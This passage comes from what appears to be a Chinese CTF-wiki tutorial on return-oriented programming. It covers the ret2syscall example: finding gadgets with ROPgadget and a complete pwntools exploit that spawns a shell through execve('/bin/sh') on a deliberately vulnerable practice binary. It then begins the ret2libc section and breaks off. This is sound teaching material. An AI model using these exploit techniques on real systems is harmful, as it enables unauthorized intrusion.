class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;);&lt;br&gt;  &lt;span class=&#34;hljs-built_in&#34;&gt;setvbuf&lt;/span&gt;(stdin, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;);&lt;br&gt;  &lt;span class=&#34;hljs-built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&#34;This time, no system() and NO SHELLCODE!!!&#34;&lt;/span&gt;);&lt;br&gt;  &lt;span class=&#34;hljs-built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&#34;What do you plan to do?&#34;&lt;/span&gt;);&lt;br&gt;  &lt;span class=&#34;hljs-built_in&#34;&gt;gets&lt;/span&gt;(&amp;amp;v4);&lt;br&gt;  &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;;&lt;br&gt;}&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;可以看出此次仍然是一个栈溢出。类似于之前的做法，我们可以获得 v4 相对于 ebp 的偏移为 108。所以我们需要覆盖的返回地址相对于 v4 的偏移为 112。此次，由于我们不能直接利用程序中的某一段代码或者自己填写代码来获得 shell，所以我们利用程序中的 gadgets 来获得 shell，而对应的 shell 获取则是利用系统调用。关于系统调用的知识，请参考&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://zh.wikipedia.org/wiki/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8&#34;&gt;https://zh.wikipedia.org/wiki/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;简单地说，只要我们把对应获取 shell 的系统调用的参数放到对应的寄存器中，那么我们在执行 int 0x80 就可执行对应的系统调用。比如说这里我们利用如下系统调用来获取 shell&lt;/p&gt;
&lt;figure class=&#34;highlight stylus&#34;&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs stylus&#34;&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-title&#34;&gt;execve&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&#34;/bin/sh&#34;&lt;/span&gt;,NULL,NULL)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;其中，该程序是 32 位，所以我们需要使得&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;系统调用号，即 eax 应该为 0xb&lt;/li&gt;
&lt;li&gt;第一个参数，即 ebx 应该指向 /bin/sh 的地址，其实执行 sh 的地址也可以。&lt;/li&gt;
&lt;li&gt;第二个参数，即 ecx 应该为 0&lt;/li&gt;
&lt;li&gt;第三个参数，即 edx 应该为 0&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;而我们如何控制这些寄存器的值 呢？这里就需要使用 gadgets。比如说，现在栈顶是 10，那么如果此时执行了 pop eax，那么现在 eax 的值就为 10。但是我们并不能期待有一段连续的代码可以同时控制对应的寄存器，所以我们需要一段一段控制，这也是我们在 gadgets 最后使用 ret 来再次控制程序执行流程的原因。具体寻找 gadgets 的方法，我们可以使用 ropgadgets 这个工具。&lt;/p&gt;
&lt;p&gt;首先，我们来寻找控制 eax 的 gadgets&lt;/p&gt;
&lt;figure class=&#34;highlight x86asm&#34;&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs x86asm&#34;&gt;➜  ret2syscall ROPgadget --binary rop  --only &lt;span class=&#34;hljs-string&#34;&gt;&#39;pop|ret&#39;&lt;/span&gt; | grep &lt;span class=&#34;hljs-string&#34;&gt;&#39;eax&#39;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-number&#34;&gt;0x0809ddda&lt;/span&gt; : &lt;span class=&#34;hljs-keyword&#34;&gt;pop&lt;/span&gt; &lt;span class=&#34;hljs-built_in&#34;&gt;eax&lt;/span&gt; &lt;span class=&#34;hljs-comment&#34;&gt;; pop ebx ; pop esi ; pop edi ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-number&#34;&gt;0x080bb196&lt;/span&gt; : &lt;span class=&#34;hljs-keyword&#34;&gt;pop&lt;/span&gt; &lt;span class=&#34;hljs-built_in&#34;&gt;eax&lt;/span&gt; &lt;span class=&#34;hljs-comment&#34;&gt;; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-number&#34;&gt;0x0807217a&lt;/span&gt; : &lt;span class=&#34;hljs-keyword&#34;&gt;pop&lt;/span&gt; &lt;span class=&#34;hljs-built_in&#34;&gt;eax&lt;/span&gt; &lt;span class=&#34;hljs-comment&#34;&gt;; ret 0x80e&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-number&#34;&gt;0x0804f704&lt;/span&gt; : &lt;span class=&#34;hljs-keyword&#34;&gt;pop&lt;/span&gt; &lt;span class=&#34;hljs-built_in&#34;&gt;eax&lt;/span&gt; &lt;span class=&#34;hljs-comment&#34;&gt;; ret 3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-number&#34;&gt;0x0809ddd9&lt;/span&gt; : &lt;span class=&#34;hljs-keyword&#34;&gt;pop&lt;/span&gt; &lt;span class=&#34;hljs-built_in&#34;&gt;es&lt;/span&gt; &lt;span class=&#34;hljs-comment&#34;&gt;; pop eax ; pop ebx ; pop esi ; pop edi ; ret&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;可以看到有上述几个都可以控制 eax，我选取第二个来作为 gadgets。&lt;/p&gt;
&lt;p&gt;类似的，我们可以得到控制其它寄存器的 gadgets&lt;/p&gt;
&lt;figure class=&#34;highlight x86asm&#34;&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs x86asm&#34;&gt;➜  ret2syscall ROPgadget --binary rop  --only &lt;span class=&#34;hljs-string&#34;&gt;&#39;pop|ret&#39;&lt;/span&gt; | grep &lt;span class=&#34;hljs-string&#34;&gt;&#39;ebx&#39;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-number&#34;&gt;0x0809dde2&lt;/span&gt; : &lt;span class=&#34;hljs-keyword&#34;&gt;pop&lt;/span&gt; &lt;span class=&#34;hljs-built_in&#34;&gt;ds&lt;/span&gt; &lt;span class=&#34;hljs-comment&#34;&gt;; pop ebx ; pop esi ; pop edi ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-number&#34;&gt;0x0809ddda&lt;/span&gt; : &lt;span class=&#34;hljs-keyword&#34;&gt;pop&lt;/span&gt; &lt;span class=&#34;hljs-built_in&#34;&gt;eax&lt;/span&gt; &lt;span class=&#34;hljs-comment&#34;&gt;; pop ebx ; pop esi ; pop edi ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-number&#34;&gt;0x0805b6ed&lt;/span&gt; : &lt;span class=&#34;hljs-keyword&#34;&gt;pop&lt;/span&gt; &lt;span class=&#34;hljs-built_in&#34;&gt;ebp&lt;/span&gt; &lt;span class=&#34;hljs-comment&#34;&gt;; pop ebx ; pop esi ; pop edi ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-number&#34;&gt;0x0809e1d4&lt;/span&gt; : &lt;span class=&#34;hljs-keyword&#34;&gt;pop&lt;/span&gt; &lt;span class=&#34;hljs-built_in&#34;&gt;ebx&lt;/span&gt; &lt;span class=&#34;hljs-comment&#34;&gt;; pop ebp ; pop esi ; pop edi ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-number&#34;&gt;0x080be23f&lt;/span&gt; : &lt;span class=&#34;hljs-keyword&#34;&gt;pop&lt;/span&gt; &lt;span class=&#34;hljs-built_in&#34;&gt;ebx&lt;/span&gt; &lt;span class=&#34;hljs-comment&#34;&gt;; pop edi ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-number&#34;&gt;0x0806eb69&lt;/span&gt; : &lt;span class=&#34;hljs-keyword&#34;&gt;pop&lt;/span&gt; &lt;span class=&#34;hljs-built_in&#34;&gt;ebx&lt;/span&gt; &lt;span class=&#34;hljs-comment&#34;&gt;; pop edx ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-number&#34;&gt;0x08092258&lt;/span&gt; : &lt;span class=&#34;hljs-keyword&#34;&gt;pop&lt;/span&gt; &lt;span class=&#34;hljs-built_in&#34;&gt;ebx&lt;/span&gt; &lt;span class=&#34;hljs-comment&#34;&gt;; pop esi ; pop ebp ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-number&#34;&gt;0x0804838b&lt;/span&gt; : &lt;span class=&#34;hljs-keyword&#34;&gt;pop&lt;/span&gt; &lt;span class=&#34;hljs-built_in&#34;&gt;ebx&lt;/span&gt; &lt;span class=&#34;hljs-comment&#34;&gt;; pop esi ; pop edi ; pop ebp ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-number&#34;&gt;0x080a9a42&lt;/span&gt; : &lt;span class=&#34;hljs-keyword&#34;&gt;pop&lt;/span&gt; &lt;span class=&#34;hljs-built_in&#34;&gt;ebx&lt;/span&gt; &lt;span class=&#34;hljs-comment&#34;&gt;; pop esi ; pop edi ; pop ebp ; ret 0x10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-number&#34;&gt;0x08096a26&lt;/span&gt; : &lt;span class=&#34;hljs-keyword&#34;&gt;pop&lt;/span&gt; &lt;span class=&#34;hljs-built_in&#34;&gt;ebx&lt;/span&gt; &lt;span class=&#34;hljs-comment&#34;&gt;; pop esi ; pop edi ; pop ebp ; ret 0x14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-number&#34;&gt;0x08070d73&lt;/span&gt; : &lt;span class=&#34;hljs-keyword&#34;&gt;pop&lt;/span&gt; &lt;span class=&#34;hljs-built_in&#34;&gt;ebx&lt;/span&gt; &lt;span class=&#34;hljs-comment&#34;&gt;; pop esi ; pop edi ; pop ebp ; ret 0xc&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-number&#34;&gt;0x0805ae81&lt;/span&gt; : &lt;span class=&#34;hljs-keyword&#34;&gt;pop&lt;/span&gt; &lt;span class=&#34;hljs-built_in&#34;&gt;ebx&lt;/span&gt; &lt;span class=&#34;hljs-comment&#34;&gt;; pop esi ; pop edi ; pop ebp ; ret 4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-number&#34;&gt;0x08049bfd&lt;/span&gt; : &lt;span class=&#34;hljs-keyword&#34;&gt;pop&lt;/span&gt; &lt;span class=&#34;hljs-built_in&#34;&gt;ebx&lt;/span&gt; &lt;span class=&#34;hljs-comment&#34;&gt;; pop esi ; pop edi ; pop ebp ; ret 8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-number&#34;&gt;0x08048913&lt;/span&gt; : &lt;span class=&#34;hljs-keyword&#34;&gt;pop&lt;/span&gt; &lt;span class=&#34;hljs-built_in&#34;&gt;ebx&lt;/span&gt; &lt;span class=&#34;hljs-comment&#34;&gt;; pop esi ; pop edi ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-number&#34;&gt;0x08049a19&lt;/span&gt; : &lt;span class=&#34;hljs-keyword&#34;&gt;pop&lt;/span&gt; &lt;span class=&#34;hljs-built_in&#34;&gt;ebx&lt;/span&gt; &lt;span class=&#34;hljs-comment&#34;&gt;; pop esi ; pop edi ; ret 4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-number&#34;&gt;0x08049a94&lt;/span&gt; : &lt;span class=&#34;hljs-keyword&#34;&gt;pop&lt;/span&gt; &lt;span class=&#34;hljs-built_in&#34;&gt;ebx&lt;/span&gt; &lt;span class=&#34;hljs-comment&#34;&gt;; pop esi ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-number&#34;&gt;0x080481c9&lt;/span&gt; : &lt;span class=&#34;hljs-keyword&#34;&gt;pop&lt;/span&gt; &lt;span class=&#34;hljs-built_in&#34;&gt;ebx&lt;/span&gt; &lt;span class=&#34;hljs-comment&#34;&gt;; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-number&#34;&gt;0x080d7d3c&lt;/span&gt; : &lt;span class=&#34;hljs-keyword&#34;&gt;pop&lt;/span&gt; &lt;span class=&#34;hljs-built_in&#34;&gt;ebx&lt;/span&gt; &lt;span class=&#34;hljs-comment&#34;&gt;; ret 0x6f9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-number&#34;&gt;0x08099c87&lt;/span&gt; : &lt;span class=&#34;hljs-keyword&#34;&gt;pop&lt;/span&gt; &lt;span class=&#34;hljs-built_in&#34;&gt;ebx&lt;/span&gt; &lt;span class=&#34;hljs-comment&#34;&gt;; ret 8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-number&#34;&gt;0x0806eb91&lt;/span&gt; : &lt;span class=&#34;hljs-keyword&#34;&gt;pop&lt;/span&gt; &lt;span class=&#34;hljs-built_in&#34;&gt;ecx&lt;/span&gt; &lt;span class=&#34;hljs-comment&#34;&gt;; pop ebx ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-number&#34;&gt;0x0806336b&lt;/span&gt; : &lt;span class=&#34;hljs-keyword&#34;&gt;pop&lt;/span&gt; &lt;span class=&#34;hljs-built_in&#34;&gt;edi&lt;/span&gt; &lt;span class=&#34;hljs-comment&#34;&gt;; pop esi ; pop ebx ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-number&#34;&gt;0x0806eb90&lt;/span&gt; : &lt;span class=&#34;hljs-keyword&#34;&gt;pop&lt;/span&gt; &lt;span class=&#34;hljs-built_in&#34;&gt;edx&lt;/span&gt; &lt;span class=&#34;hljs-comment&#34;&gt;; pop ecx ; pop ebx ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-number&#34;&gt;0x0809ddd9&lt;/span&gt; : &lt;span class=&#34;hljs-keyword&#34;&gt;pop&lt;/span&gt; &lt;span class=&#34;hljs-built_in&#34;&gt;es&lt;/span&gt; &lt;span class=&#34;hljs-comment&#34;&gt;; pop eax ; pop ebx ; pop esi ; pop edi ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-number&#34;&gt;0x0806eb68&lt;/span&gt; : &lt;span class=&#34;hljs-keyword&#34;&gt;pop&lt;/span&gt; &lt;span class=&#34;hljs-built_in&#34;&gt;esi&lt;/span&gt; &lt;span class=&#34;hljs-comment&#34;&gt;; pop ebx ; pop edx ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-number&#34;&gt;0x0805c820&lt;/span&gt; : &lt;span class=&#34;hljs-keyword&#34;&gt;pop&lt;/span&gt; &lt;span class=&#34;hljs-built_in&#34;&gt;esi&lt;/span&gt; &lt;span class=&#34;hljs-comment&#34;&gt;; pop ebx ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-number&#34;&gt;0x08050256&lt;/span&gt; : &lt;span class=&#34;hljs-keyword&#34;&gt;pop&lt;/span&gt; &lt;span class=&#34;hljs-built_in&#34;&gt;esp&lt;/span&gt; &lt;span class=&#34;hljs-comment&#34;&gt;; pop ebx ; pop esi ; pop edi ; pop ebp ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-number&#34;&gt;0x0807b6ed&lt;/span&gt; : &lt;span class=&#34;hljs-keyword&#34;&gt;pop&lt;/span&gt; &lt;span class=&#34;hljs-built_in&#34;&gt;ss&lt;/span&gt; &lt;span class=&#34;hljs-comment&#34;&gt;; pop ebx ; ret&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;这里，我选择&lt;/p&gt;
&lt;figure class=&#34;highlight arcade&#34;&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs arcade&#34;&gt;&lt;span class=&#34;hljs-number&#34;&gt;0x0806eb90&lt;/span&gt; : &lt;span class=&#34;hljs-built_in&#34;&gt;pop&lt;/span&gt; edx ; &lt;span class=&#34;hljs-built_in&#34;&gt;pop&lt;/span&gt; ecx ; &lt;span class=&#34;hljs-built_in&#34;&gt;pop&lt;/span&gt; ebx ; ret&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;这个可以直接控制其它三个寄存器。&lt;/p&gt;
&lt;p&gt;此外，我们需要获得 /bin/sh 字符串对应的地址。&lt;/p&gt;
&lt;figure class=&#34;highlight asciidoc&#34;&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs asciidoc&#34;&gt;➜  ret2syscall ROPgadget --binary rop  --string &lt;span class=&#34;hljs-emphasis&#34;&gt;&#39;/bin/sh&#39;&lt;/span&gt; &lt;br&gt;&lt;span class=&#34;hljs-section&#34;&gt;Strings information&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-section&#34;&gt;============================================================&lt;/span&gt;&lt;br&gt;0x080be408 : /bin/sh&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;可以找到对应的地址，此外，还有 int 0x80 的地址，如下&lt;/p&gt;
&lt;figure class=&#34;highlight asciidoc&#34;&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs asciidoc&#34;&gt;➜  ret2syscall ROPgadget --binary rop  --only &lt;span class=&#34;hljs-emphasis&#34;&gt;&#39;int&#39;&lt;/span&gt;                 &lt;br&gt;&lt;span class=&#34;hljs-section&#34;&gt;Gadgets information&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-section&#34;&gt;============================================================&lt;/span&gt;&lt;br&gt;0x08049421 : int 0x80&lt;br&gt;0x080938fe : int 0xbb&lt;br&gt;0x080869b5 : int 0xf6&lt;br&gt;0x0807b4d4 : int 0xfc&lt;br&gt;&lt;br&gt;Unique gadgets found: 4&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;同时，也找到对应的地址了。&lt;/p&gt;
&lt;p&gt;下面就是对应的 payload，其中 0xb 为 execve 对应的系统调用号。&lt;/p&gt;
&lt;figure class=&#34;highlight makefile&#34;&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs makefile&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;#!/usr/bin/env python&lt;/span&gt;&lt;br&gt;from pwn import *&lt;br&gt;&lt;br&gt;sh = process(&#39;./rop&#39;)&lt;br&gt;&lt;br&gt;pop_eax_ret = 0x080bb196&lt;br&gt;pop_edx_ecx_ebx_ret = 0x0806eb90&lt;br&gt;int_0x80 = 0x08049421&lt;br&gt;binsh = 0x80be408&lt;br&gt;payload = flat(&lt;br&gt;    [&#39;A&#39; * 112, pop_eax_ret, 0xb, pop_edx_ecx_ebx_ret, 0, 0, binsh, int_0x80])&lt;br&gt;sh.sendline(payload)&lt;br&gt;sh.interactive()&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&#34;题目-¶-1&#34;&gt;&lt;a href=&#34;#题目-¶-1&#34; class=&#34;headerlink&#34; title=&#34;题目 ¶&#34;&gt;&lt;/a&gt;题目 &lt;a href=&#34;https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#_8&#34;&gt;¶&lt;/a&gt;&lt;/h3&gt;&lt;h2 id=&#34;ret2libc¶&#34;&gt;&lt;a href=&#34;#ret2libc¶&#34; class=&#34;headerlink&#34; title=&#34;ret2libc¶&#34;&gt;&lt;/a&gt;ret2libc&lt;a href=&#34;https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#ret2libc&#34;&gt;¶&lt;/a&gt;&lt;/h2&gt;&lt;h3 id=&#34;原理-¶-3&#34;&gt;&lt;a href=&#34;#原理-¶-3&#34; class=&#34;headerlink&#34; title=&#34;原理 ¶&#34;&gt;&lt;/a&gt;原理 &lt;a href=&#34;https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#_9&#34;&gt;¶&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;ret2libc 即控制函数的执行 libc 中的函数，通常是返回至某个函数的 plt 处或者函数的具体位置 (即函数对应的 got 表项的内容)。一般情况下，我们会选择执行 system(“/bin/sh”)，故而此时我们需要知道 system 函数的地址。&lt;/p&gt;
&lt;h3 id=&#34;例子-¶-3&#34;&gt;&lt;a href=&#34;#例子-¶-3&#34; class=&#34;headerlink&#34; title=&#34;例子 ¶&#34;&gt;&lt;/a&gt;例子 &lt;a href=&#34;https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#_10&#34;&gt;¶&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;我们由简单到难分别给出三个例子。&lt;/p&gt;
&lt;h4 id=&#34;例-1¶&#34;&gt;&lt;a href=&#34;#例-1¶&#34; class=&#34;headerlink&#34; title=&#34;例 1¶&#34;&gt;&lt;/a&gt;例 1&lt;a href=&#34;https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#1&#34;&gt;¶&lt;/a&gt;&lt;/h4&gt;&lt;p&gt;这里我们以 bamboofox 中 ret2libc1 为例&lt;/p&gt;
&lt;p&gt;点击下载: &lt;a href=&#34;https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2libc/ret2libc1/ret2libc1&#34;&gt;ret2libc1&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;首先，我们可以检查一下程序的安全保护&lt;/p&gt;
